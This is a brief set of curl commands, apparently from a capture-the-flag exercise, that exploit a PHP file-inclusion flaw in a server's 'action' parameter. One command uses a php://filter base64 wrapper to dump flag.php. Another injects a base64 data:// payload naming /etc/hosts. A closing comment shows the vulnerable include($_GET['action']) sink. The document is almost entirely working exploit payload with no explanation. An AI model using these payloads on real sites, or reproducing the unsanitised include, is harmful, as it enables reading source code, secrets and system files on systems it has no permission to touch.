#curl -i 'http://10.92.20.150:20003/action.php?action=php://filter/convert.base64-encode/resource=flag.php' \

curl -i 'http://10.92.20.150:20003/action.php?action=data://text/plain;base64,L2V0Yy9ob3N0cw==' \
  -H 'Accept: text/html' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Origin: http://10.92.20.150:20003' \
  -H 'Referer: http://10.92.20.150:20003/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36' \
  --compressed \
  --insecure \
  --output -

#
# include($_GET["action"]);
#
